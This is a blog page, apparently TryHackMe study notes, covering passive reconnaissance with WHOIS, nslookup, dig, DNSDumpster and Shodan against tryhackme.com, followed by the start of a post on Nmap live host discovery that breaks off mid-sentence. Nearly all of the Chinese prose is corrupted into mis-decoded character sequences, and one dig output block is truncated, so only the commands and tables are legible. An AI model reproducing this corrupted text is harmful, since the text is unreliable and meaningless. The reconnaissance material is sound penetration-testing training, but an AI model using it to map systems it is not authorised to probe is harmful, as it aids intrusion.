<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è·å¾—æœ‰å…³æ³¨å†Œå•†å’Œæ³¨å†Œäººçš„ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æ³¨å†Œäººçš„å§“åå’Œè”ç³»ä¿¡æ¯ï¼ˆé™¤éä»–ä»¬ä½¿ç”¨æŸäº›éšç§æœåŠ¡ï¼‰ã€‚å°½ç®¡æœªæ˜¾ç¤ºåœ¨ä¸Šé¢ï¼Œä½†æˆ‘ä»¬è·å¾—äº†è¯¥åŸŸçš„ç®¡ç†å‘˜å’ŒæŠ€æœ¯è”ç³»äººã€‚æœ€åï¼Œæˆ‘ä»¬çœ‹åˆ°åŸŸåæœåŠ¡å™¨ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä»»ä½•DNSè®°å½•è¦æŸ¥æ‰¾ï¼Œæˆ‘ä»¬åº”è¯¥æŸ¥è¯¢è¿™äº›æœåŠ¡å™¨ã€‚</p>
<p>å¯ä»¥æ£€æŸ¥æ”¶é›†çš„ä¿¡æ¯ä»¥å‘ç°æ–°çš„æ”»å‡»é¢ï¼Œä¾‹å¦‚ç¤¾ä¼šå·¥ç¨‹æˆ–æŠ€æœ¯æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œæ ¹æ®æ¸—é€æµ‹è¯•çš„èŒƒå›´ï¼Œä½ å¯èƒ½ä¼šè€ƒè™‘å¯¹ç®¡ç†å‘˜ç”¨æˆ·çš„ç”µå­é‚®ä»¶æœåŠ¡å™¨æˆ–DNSæœåŠ¡å™¨è¿›è¡Œæ”»å‡»ï¼Œå‡è®¾è¿™äº›æœåŠ¡å™¨å±äºä½ çš„å®¢æˆ·ç«¯ï¼Œå¹¶ä¸”å±äºæ¸—é€æµ‹è¯•çš„èŒƒç•´ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºè‡ªåŠ¨åŒ–å·¥å…·æ»¥ç”¨WHOISæŸ¥è¯¢æ¥è·å–ç”µå­é‚®ä»¶åœ°å€ï¼Œè®¸å¤šWHOISæœåŠ¡å¯¹æ­¤é‡‡å–äº†æªæ–½ã€‚ä¾‹å¦‚ï¼Œä»–ä»¬å¯èƒ½ä¼šä¿®æ”¹ç”µå­é‚®ä»¶åœ°å€ã€‚æ­¤å¤–ï¼Œè®¸å¤šæ³¨å†Œè€…è®¢é˜…éšç§æœåŠ¡ï¼Œä»¥é¿å…åƒåœ¾é‚®ä»¶å‘é€è€…è·å–ä»–ä»¬çš„ç”µå­é‚®ä»¶åœ°å€ï¼Œå¹¶ä¿æŒä»–ä»¬çš„ä¿¡æ¯éšç§ã€‚</p>
<h2 id="nslookup">nslookup</h2>
<p>ä½¿ç”¨<code>nslookup</code>ï¼ˆåç§°æœåŠ¡å™¨æŸ¥æ‰¾ï¼‰æŸ¥æ‰¾åŸŸåçš„IPåœ°å€ã€‚ä½ éœ€è¦å‘å‡ºå‘½ä»¤<code>nslookup DOMAIN_NAME</code>ï¼Œä¾‹å¦‚<code>nslookup tryhackme.com</code>ã€‚æˆ–è€…ï¼Œæ›´ä¸€èˆ¬åœ°ï¼Œä½ å¯ä»¥ä½¿ç”¨<code>nslookup OPTIONS DOMAIN_NAME SERVER</code>ã€‚è¿™ä¸‰ä¸ªä¸»è¦å‚æ•°æ˜¯ï¼š</p>
<ul>
<li><code>OPTIONS</code>åŒ…æ‹¬å¦‚ä¸‹è¡¨æ‰€ç¤ºçš„æŸ¥è¯¢ç±»å‹ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥ä½¿ç”¨<code>A</code>(ç”¨äºIPv4)æˆ–è€…<code>AAAA</code>(ç”¨äºIPv6)ã€‚</li>
<li><code>DOMAIN_NAME</code>æ˜¯ä½ éœ€è¦æŸ¥è¯¢çš„åŸŸåã€‚</li>
<li><code>SERVER</code>æ˜¯è¦æŸ¥è¯¢çš„DNSæœåŠ¡å™¨ï¼Œä½ å¯ä»¥é€‰æ‹©è¦æŸ¥è¯¢çš„ä»»ä½•æœ¬åœ°æˆ–è€…å…¬ç”¨çš„DNSæœåŠ¡å™¨ã€‚Cloudflare
æä¾›<code>1.1.1.1</code>å’Œ<code>1.0.0.1</code>ï¼ŒGoogle
æä¾›<code>8.8.8.8</code>å’Œ<code>8.8.4.4</code>ï¼ŒQuad9
æä¾›<code>9.9.9.9</code>å’Œ<code>149.112.112.112</code>ã€‚å¦‚æœä½ æƒ³æ›¿æ¢ISPçš„DNSæœåŠ¡å™¨ï¼Œå¯ä»¥é€‰æ‹©æ›´å¤šçš„å…¬å…±DNSæœåŠ¡å™¨ã€‚</li>
</ul>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">Query type</th>
<th style="text-align: center;">Result</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">A</td>
<td style="text-align: center;">IPv4 Addresses</td>
</tr>
<tr class="even">
<td style="text-align: center;">AAAA</td>
<td style="text-align: center;">IPv6 Addresses</td>
</tr>
<tr class="odd">
<td style="text-align: center;">CNAME</td>
<td style="text-align: center;">Canonical Name</td>
</tr>
<tr class="even">
<td style="text-align: center;">MX</td>
<td style="text-align: center;">Mail Servers</td>
</tr>
<tr class="odd">
<td style="text-align: center;">SOA</td>
<td style="text-align: center;">Start of Authority</td>
</tr>
<tr class="even">
<td style="text-align: center;">TXT</td>
<td style="text-align: center;">TXT Records</td>
</tr>
</tbody>
</table>
<p>ä¾‹å¦‚ï¼Œä½¿ç”¨<code>nslookup -type=A tryhackme.com 1.1.1.1</code>æˆ–<code>nslookup -type=a tryhackme.com 1.1.1.1</code>èƒ½å¤Ÿè¿”å›
tryhackme.com ä½¿ç”¨è¿‡çš„æ‰€æœ‰ IPv4 åœ°å€ã€‚</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">user@TryHackMe$ nslookup -<span class="built_in">type</span>=A tryhackme.com 1.1.1.1</span><br><span class="line">Server:		1.1.1.1</span><br><span class="line">Address:	1.1.1.1<span class="comment">#53</span></span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:	tryhackme.com</span><br><span class="line">Address: 172.67.69.208</span><br><span class="line">Name:	tryhackme.com</span><br><span class="line">Address: 104.26.11.229</span><br><span class="line">Name:	tryhackme.com</span><br><span class="line">Address: 104.26.10.229</span><br></pre></td></tr></tbody></table></figure>
<p>A å’Œ AAAA è®°å½•åˆ†åˆ«ç”¨äºè¿”å› IPv4å’Œ
IPv6åœ°å€ã€‚ä»æ¸—é€æµ‹è¯•çš„è§’åº¦æ¥çœ‹ï¼Œè¿™ç§æŸ¥æ‰¾éå¸¸æœ‰ç”¨ã€‚åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä»ä¸€ä¸ªåŸŸåå¼€å§‹ï¼Œè·å¾—äº†ä¸‰ä¸ª
IPv4åœ°å€ã€‚å‡è®¾è¿™äº› IP
åœ°å€ä½äºæ¸—é€æµ‹è¯•çš„èŒƒå›´ä¹‹å†…ï¼Œå°±å¯ä»¥è¿›ä¸€æ­¥æ£€æŸ¥å®ƒä»¬æ˜¯å¦å­˜åœ¨ä¸å®‰å…¨æ€§ã€‚</p>
<p>å‡è®¾ä½ æƒ³äº†è§£ç‰¹å®šåŸŸçš„ç”µå­é‚®ä»¶æœåŠ¡å™¨å’Œé…ç½®ã€‚å¯ä»¥ä½¿ç”¨
<code>nslookup-type = MX tryhackme.com</code>ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªä¾‹å­:</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">user@TryHackMe$ nslookup -<span class="built_in">type</span>=MX tryhackme.com</span><br><span class="line">Server:		127.0.0.53</span><br><span class="line">Address:	127.0.0.53<span class="comment">#53</span></span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">tryhackme.com	mail exchanger = 5 alt1.aspmx.l.google.com.</span><br><span class="line">tryhackme.com	mail exchanger = 1 aspmx.l.google.com.</span><br><span class="line">tryhackme.com	mail exchanger = 10 alt4.aspmx.l.google.com.</span><br><span class="line">tryhackme.com	mail exchanger = 10 alt3.aspmx.l.google.com.</span><br><span class="line">tryhackme.com	mail exchanger = 5 alt2.aspmx.l.google.com.</span><br></pre></td></tr></tbody></table></figure>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° tryhackme.com å½“å‰çš„ç”µå­é‚®ä»¶é…ç½®ä½¿ç”¨ Googleã€‚ç”±äº MX
ä¼šæŸ¥æ‰¾ Mail Exchange
æœåŠ¡å™¨ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°å½“ä¸€ä¸ªé‚®ä»¶æœåŠ¡å™¨å°è¯•å‘<code>@tryhackme.com</code>
å‘é€ç”µå­é‚®ä»¶æ—¶ï¼Œå®ƒä¼šå°è¯•è¿æ¥åˆ°è®¢å•ä¸º 1 çš„
<code>aspmx.l.google.com</code>ã€‚å¦‚æœç¹å¿™æˆ–ä¸å¯ç”¨ï¼Œé‚®ä»¶æœåŠ¡å™¨å°†å°è¯•æŒ‰é¡ºåºè¿æ¥åˆ°ä¸‹ä¸€ä¸ªé‚®ä»¶äº¤æ¢æœåŠ¡å™¨ã€
<code>alt1.aspmx.l.google.com</code> æˆ–
<code>alt2.aspmx.l.google.com</code>ã€‚</p>
<p>Google æä¾›äº†åˆ—å‡ºçš„é‚®ä»¶æœåŠ¡å™¨;
å› æ­¤ï¼Œæˆ‘ä»¬ä¸åº”è¯¥æœŸæœ›é‚®ä»¶æœåŠ¡å™¨è¿è¡Œçš„æ˜¯ä¸€ä¸ªæ˜“å—æ”»å‡»çš„æœåŠ¡å™¨ç‰ˆæœ¬ã€‚ä½†æ˜¯ï¼Œåœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå‘ç°é‚®ä»¶æœåŠ¡å™¨æ²¡æœ‰å¾—åˆ°å……åˆ†çš„å®‰å…¨ä¿æŠ¤æˆ–ä¿®è¡¥ã€‚</p>
<p>å½“ä½ ç»§ç»­è¢«åŠ¨åœ°ä¾¦å¯Ÿä½ çš„ç›®æ ‡æ—¶ï¼Œè¿™äº›ä¿¡æ¯å¯èƒ½ä¼šè¢«è¯æ˜æ˜¯æœ‰ä»·å€¼çš„ã€‚ä½ å¯ä»¥å¯¹å…¶ä»–åŸŸåé‡å¤ç±»ä¼¼çš„æŸ¥è¯¢ï¼Œå¹¶å°è¯•ä¸åŒçš„ç±»å‹ï¼Œä¾‹å¦‚<code>-type=txt</code>ã€‚è°çŸ¥é“ä½ ä¸€è·¯èµ°æ¥ä¼šå‘ç°ä»€ä¹ˆæ ·çš„ä¿¡æ¯å‘¢ï¼</p>
<h2 id="dig">dig</h2>
<p>å¯¹äºæ›´é«˜çº§çš„ DNS æŸ¥è¯¢å’Œå…¶ä»–åŠŸèƒ½ï¼Œå¯ä»¥ä½¿ç”¨ <code>dig</code>ï¼Œå³â€œ
Domain Information Groperâ€çš„é¦–å­—æ¯ç¼©å†™ã€‚è®©æˆ‘ä»¬ä½¿ç”¨ dig æŸ¥æ‰¾ MX
è®°å½•ï¼Œå¹¶å°†å®ƒä»¬ä¸ <code>nslookup</code> è¿›è¡Œæ¯”è¾ƒã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨
<code>dig DOMAIN _ NAME</code>ï¼Œä½†æ˜¯ä¸ºäº†æŒ‡å®šè®°å½•ç±»å‹ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨
<code>dig DOMAIN_NAME TYPE</code>ã€‚æˆ–è€…ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨
<code>dig @SERVER DOMAIN_NAME TYPE</code>é€‰æ‹©è¦æŸ¥è¯¢çš„æœåŠ¡å™¨ã€‚</p>
<ul>
<li><code>SERVER</code>æ˜¯è¦æŸ¥è¯¢çš„ DNSæœåŠ¡å™¨ã€‚</li>
<li><code>DOMAIN_NAME</code>æ˜¯ä½ æ­£åœ¨æŸ¥è¯¢çš„åŸŸåã€‚</li>
<li><code>TYPE</code>åŒ…å« DNS è®°å½•ç±»å‹ã€‚</li>
</ul>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@TryHackMe$ dig tryhackme.com MX</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.16.19-RH &lt;&lt;&gt;&gt; tryhackme.com MX</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;</span><br></pre></td></tr></tbody></table></figure>
<p>å¿«é€Ÿæ¯”è¾ƒä¸€ä¸‹ <code>nslookup</code> å’Œ <code>dig</code>çš„è¾“å‡ºï¼Œå‘ç°
<code>dig</code> è¿”å›äº†æ›´å¤šçš„ä¿¡æ¯ï¼Œæ¯”å¦‚é»˜è®¤æƒ…å†µä¸‹çš„ TTL (Time To
Live)ã€‚å¦‚æœæƒ³æŸ¥è¯¢<code>1.1.1.1</code> DNS æœåŠ¡å™¨ï¼Œå¯ä»¥æ‰§è¡Œ
<code>dig @1.1.1.1 tryhackme.com MX</code>ã€‚</p>
<h2 id="dnsdumpster">DNSDumpster</h2>
<p>DNS æŸ¥æ‰¾å·¥å…·(å¦‚ nslookup å’Œ
dig)æ— æ³•è‡ªè¡ŒæŸ¥æ‰¾å­åŸŸã€‚ä½ æ­£åœ¨æ£€æŸ¥çš„åŸŸå¯èƒ½åŒ…æ‹¬ä¸€ä¸ªä¸åŒçš„å­åŸŸï¼Œè¯¥å­åŸŸå¯ä»¥æ˜¾ç¤ºå…³äºç›®æ ‡çš„è®¸å¤šä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ
tryhackme.com æ‹¥æœ‰å­åŸŸåçš„ wiki.tryhackme.com å’Œ webmail.tryhackme.com
ï¼Œé‚£ä¹ˆä½ éœ€è¦äº†è§£æ›´å¤šå…³äºè¿™ä¸¤ä¸ªåŸŸåçš„ä¿¡æ¯ï¼Œå› ä¸ºå®ƒä»¬å¯ä»¥ä¿å­˜å…³äºä½ çš„ç›®æ ‡çš„å¤§é‡ä¿¡æ¯ã€‚æœ‰å¯èƒ½å…¶ä¸­ä¸€ä¸ªå­åŸŸå·²ç»å»ºç«‹ï¼Œä½†æ²¡æœ‰å®šæœŸæ›´æ–°ã€‚ç¼ºä¹é€‚å½“çš„å®šæœŸæ›´æ–°é€šå¸¸ä¼šå¯¼è‡´è„†å¼±çš„æœåŠ¡ã€‚ä½†æ˜¯æˆ‘ä»¬æ€ä¹ˆçŸ¥é“è¿™æ ·çš„å­åŸŸå­˜åœ¨å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨å¤šä¸ªæœç´¢å¼•æ“æ¥ç¼–åˆ¶ä¸€ä¸ªå…¬å¼€å·²çŸ¥å­åŸŸåçš„åˆ—è¡¨ã€‚ä¸€ä¸ªæœç´¢å¼•æ“æ˜¯ä¸å¤Ÿçš„;
æ­¤å¤–ï¼Œæˆ‘ä»¬åº”è¯¥æœŸæœ›é€šè¿‡è‡³å°‘æ•°åä¸ªæœç´¢ç»“æœæ¥æ‰¾åˆ°æœ‰è¶£çš„æ•°æ®ã€‚æ¯•ç«Ÿï¼Œä½ æ­£åœ¨å¯»æ‰¾æ²¡æœ‰æ˜ç¡®å…¬å¸ƒçš„å­åŸŸï¼Œå› æ­¤ä¸å¿…å°†å…¶æ·»åŠ åˆ°æœç´¢ç»“æœçš„ç¬¬ä¸€é¡µã€‚å‘ç°æ­¤ç±»å­åŸŸçš„å¦ä¸€ç§æ–¹æ³•æ˜¯ä¾é æš´åŠ›å¼ºåˆ¶æŸ¥è¯¢æ¥æŸ¥æ‰¾å“ªäº›å­åŸŸå…·æœ‰DNSè®°å½•ã€‚</p>
<p>ä¸ºäº†é¿å…è¿™ç§è€—æ—¶çš„æœç´¢ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªåœ¨çº¿æœåŠ¡ï¼Œè¯¥åœ¨çº¿æœåŠ¡å¯ä»¥æä¾› DNS
æŸ¥è¯¢çš„è¯¦ç»†ç»“æœï¼Œå¦‚ <a target="_blank" rel="noopener" href="https://dnsdumpster.com/">DNSDumpster</a>ã€‚å¦‚æœæˆ‘ä»¬åœ¨ DNSDumpster
ä¸­æœç´¢ <code>tryhackme.com</code>ï¼Œæˆ‘ä»¬ä¼šå‘ç°å­åŸŸå
<code>blog.tryhackme.com</code> ï¼Œè¿™æ˜¯å…¸å‹çš„ DNS
æŸ¥è¯¢æ‰€æ— æ³•æä¾›çš„ã€‚æ­¤å¤–ï¼ŒDNSDumpster
å°†ä»¥æ˜“äºé˜…è¯»çš„è¡¨æ ¼å’Œå›¾è¡¨çš„å½¢å¼è¿”å›æ”¶é›†çš„ DNS ä¿¡æ¯ã€‚DNSDumpster
è¿˜å°†æä¾›ä»»ä½•æ”¶é›†åˆ°çš„æœ‰å…³ç›‘å¬æœåŠ¡å™¨çš„ä¿¡æ¯ã€‚</p>
<h2 id="shodan.io">Shodan.io</h2>
<p>å½“ä½ çš„ä»»åŠ¡æ˜¯é’ˆå¯¹ç‰¹å®šç›®æ ‡è¿è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œä½œä¸ºè¢«åŠ¨ä¾¦å¯Ÿé˜¶æ®µçš„ä¸€éƒ¨åˆ†ï¼Œåƒ
<a target="_blank" rel="noopener" href="https://www.shodan.io/">Shodan.io</a>
è¿™æ ·çš„æœåŠ¡å¯ä»¥å¸®åŠ©ä½ äº†è§£å®¢æˆ·ç½‘ç»œçš„å„ç§ä¿¡æ¯ï¼Œè€Œä¸éœ€è¦ä¸»åŠ¨è¿æ¥ã€‚æ­¤å¤–ï¼Œåœ¨é˜²å¾¡æ–¹é¢ï¼Œä½ å¯ä»¥ä½¿ç”¨
Shodan.io ä¸­çš„ä¸åŒæœåŠ¡æ¥äº†è§£å±äºä½ çš„ç»„ç»‡çš„å·²è¿æ¥å’Œå·²å…¬å¼€çš„è®¾å¤‡ã€‚</p>
<p>Shodan.io
è¯•å›¾è¿æ¥åˆ°æ¯ä¸€ä¸ªå¯ä»¥åœ¨çº¿è®¿é—®çš„è®¾å¤‡ï¼Œä»¥å»ºç«‹ä¸€ä¸ªè¿æ¥â€œäº‹ç‰©â€çš„æœç´¢å¼•æ“ï¼Œä¸ç½‘é¡µæœç´¢å¼•æ“å½¢æˆå¯¹æ¯”ã€‚ä¸€æ—¦å¾—åˆ°å“åº”ï¼Œå®ƒå°±ä¼šæ”¶é›†ä¸æœåŠ¡ç›¸å…³çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¹¶å°†å…¶ä¿å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œä»¥ä¾¿è¿›è¡Œæœç´¢ã€‚ä»¥ä¸‹æ˜¯
tryhackme.com æœåŠ¡å™¨çš„ä¿å­˜è®°å½•ã€‚</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230118223806186.png" alt="image-20230118223806186">
<figcaption aria-hidden="true">image-20230118223806186</figcaption>
</figure>
<p>è¿™ä¸ªè®°å½•æ˜¾ç¤ºäº†ä¸€ä¸ª Web æœåŠ¡å™¨; ç„¶è€Œï¼Œæ­£å¦‚å‰é¢æåˆ°çš„ï¼ŒShodan.io
æ”¶é›†ä¸å®ƒèƒ½åœ¨çº¿æ‰¾åˆ°çš„ä»»ä½•è®¾å¤‡ç›¸å…³çš„ä¿¡æ¯ã€‚åœ¨ Shodan.io ä¸Šæœç´¢
<code>tryhackme.com</code> è‡³å°‘ä¼šæ˜¾ç¤ºä¸Šé¢æˆªå›¾æ‰€ç¤ºçš„è®°å½•ã€‚é€šè¿‡ Shodan.io
çš„æœç´¢ç»“æœï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°ä¸€äº›ä¸æœç´¢ç›¸å…³çš„ä¸œè¥¿ï¼Œæ¯”å¦‚:</p>
<ul>
<li>IPåœ°å€</li>
<li>æ‰˜ç®¡å…¬å¸</li>
<li>åœ°ç†ä½ç½®</li>
<li>æœåŠ¡å™¨ç±»å‹ä¸ç‰ˆæœ¬</li>
</ul>
<h2 id="æ€»ç»“">æ€»ç»“</h2>
<table>
<colgroup>
<col style="width: 46%">
<col style="width: 53%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">Purpose</th>
<th style="text-align: center;">Commandline Example</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">Lookup WHOIS record</td>
<td style="text-align: center;"><code>whois tryhackme.com</code></td>
</tr>
<tr class="even">
<td style="text-align: center;">Lookup DNS A records</td>
<td style="text-align: center;"><code>nslookup -type=A tryhackme.com</code></td>
</tr>
<tr class="odd">
<td style="text-align: center;">Lookup DNS MX records at DNS server</td>
<td style="text-align: center;"><code>nslookup -type=MX tryhackme.com 1.1.1.1</code></td>
</tr>
<tr class="even">
<td style="text-align: center;">Lookup DNS TXT records</td>
<td style="text-align: center;"><code>nslookup -type=TXT tryhackme.com</code></td>
</tr>
<tr class="odd">
<td style="text-align: center;">Lookup DNS A records</td>
<td style="text-align: center;"><code>dig tryhackme.com A</code></td>
</tr>
<tr class="even">
<td style="text-align: center;">Lookup DNS MX records at DNS server</td>
<td style="text-align: center;"><code>dig @1.1.1.1 tryhackme.com MX</code></td>
</tr>
<tr class="odd">
<td style="text-align: center;">Lookup DNS TXT records</td>
<td style="text-align: center;"><code>dig tryhackme.com TXT</code></td>
</tr>
</tbody>
</table>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/28/Nmap-live-host/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/Nmap-live-host/" class="post-title-link" itemprop="url">Nmap Live Host Discovery</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-02-28 14:30:13" itemprop="dateCreated datePublished" datetime="2023-02-28T14:30:13+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-01-24 22:12:43" itemprop="dateModified" datetime="2023-01-24T22:12:43+08:00">2023-01-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>8.4k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
              <span>8 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMeå®éªŒæˆ¿é—´ï¼šhttps://tryhackme.com/room/nmap01</p>
<h2 id="introduction">Introduction</h2>
<p>è¿™ä¸ªæˆ¿é—´ä¸»è¦ä»‹ç»äº†å¦‚ä½•ä½¿ç”¨ Nmap æŸ¥æ‰¾æ´»åŠ¨ä¸»æœº(live
host)ã€‚ç”¨äºå‘ç°æ´»åŠ¨ä¸»æœºçš„æ–¹æ³•åŒ…æ‹¬ï¼š</p>
<ul>
<li>ARP æ‰«æï¼šè¿™ç§æ‰«æä½¿ç”¨ ARP è¯·æ±‚æ¥å‘ç°æ´»åŠ¨ä¸»æœºã€‚</li>
<li>ICMP æ‰«æï¼šè¿™ç§æ‰«æä½¿ç”¨ ICMP è¯·æ±‚æ¥æ ‡è¯†æ´»åŠ¨ä¸»æœºã€‚</li>
<li>TCP / UDP ping æ‰«æï¼šæ­¤æ‰«æå°†æ•°æ®åŒ…å‘é€åˆ° TCP ç«¯å£å’Œ UDP
ç«¯å£ä»¥ç¡®å®šæ´»åŠ¨ä¸»æœºã€‚</li>
</ul>
<p>æˆ‘ä»¬è¿˜å°†ä»‹ç»ä¸¤ç§æ‰«æå™¨ï¼š<code>arp-scan</code>å’Œ<code>masscan</code>ã€‚å¹¶è§£é‡Šå®ƒä»¬å¦‚ä½•ä¸
Nmap å‘ç°æ´»åŠ¨ä¸»æœºè¿™ä¸€éƒ¨åˆ†é‡å ã€‚</p>
<p>ä¸‹é¢æ˜¯ Nmap
æ‰«æé€šå¸¸è¦ç»å†çš„æ­¥éª¤ï¼Œå…¶ä¸­å¾ˆå¤šæ­¥éª¤æ˜¯å¯é€‰çš„ï¼Œå–å†³äºæä¾›çš„å‚æ•°ã€‚</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230122092609574.png" alt="image-20230122092609574">
<figcaption aria-hidden="true">image-20230122092609574</figcaption>
</figure>
<h2 id="subnetworkså­ç½‘">Subnetworksï¼ˆå­ç½‘ï¼‰</h2>
<p><em>ç½‘æ®µ</em>
æ˜¯ä½¿ç”¨å…±äº«ä»‹è´¨è¿æ¥çš„ä¸€ç»„è®¡ç®—æœºï¼Œè¿™äº›ä»‹è´¨å¯ä»¥æ˜¯ä»¥å¤ªç½‘äº¤æ¢æœºæˆ– WIFI
æ¥å…¥ç‚¹ã€‚åœ¨IPç½‘ç»œä¸­ï¼Œ<em>å­ç½‘</em>
é€šå¸¸ç›¸å½“äºè¿æ¥åœ¨ä¸€èµ·å¹¶é…ç½®ä¸ºä½¿ç”¨ç›¸åŒè·¯ç”±å™¨çš„ä¸€ä¸ªæˆ–å¤šä¸ªç½‘æ®µã€‚ç½‘æ®µæ˜¯æŒ‡ç‰©ç†è¿æ¥ï¼Œè€Œå­ç½‘æ˜¯æŒ‡é€»è¾‘è¿æ¥ã€‚</p>
<p>ä¸‹å›¾ä¸­æœ‰å››ä¸ªç½‘æ®µæˆ–å­ç½‘ã€‚æ¯ä¸ªå­ç½‘æœ‰å®ƒè‡ªå·±çš„ IP
åœ°å€èŒƒå›´ï¼Œå¹¶é€šè¿‡è·¯ç”±å™¨è¿æ¥åˆ°æ›´å¤§çš„ç½‘ç»œä¸­ã€‚æ ¹æ®æ¯ä¸ªç½‘ç»œï¼Œå¯èƒ½æœ‰é˜²ç«å¢™å¼ºåˆ¶æ‰§è¡Œå®‰å…¨ç­–ç•¥ã€‚</p>
<figure>
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/aa787518e856e0094cb40da8399be0f3.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>å¦‚æœä½ è¿æ¥åˆ°ç›¸åŒçš„å­ç½‘ï¼Œä½ ä¼šæœŸæœ›ä½ çš„æ‰«æå™¨ä¾èµ–äº ARP
(åœ°å€è§£æåè®®)æŸ¥è¯¢æ¥å‘ç°æ´»åŠ¨ä¸»æœºã€‚ARP æŸ¥è¯¢çš„ç›®çš„æ˜¯è·å–ç¡¬ä»¶åœ°å€(MAC åœ°å€)
ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡é“¾è·¯å±‚è¿›è¡Œé€šä¿¡ï¼Œç„¶è€Œï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥æ¨æ–­ä¸»æœºæ˜¯å¦åœ¨çº¿ã€‚</p>
<p>å¦‚æœä½ åœ¨ç½‘ç»œ A ä¸­ï¼Œä½¿ç”¨ ARP
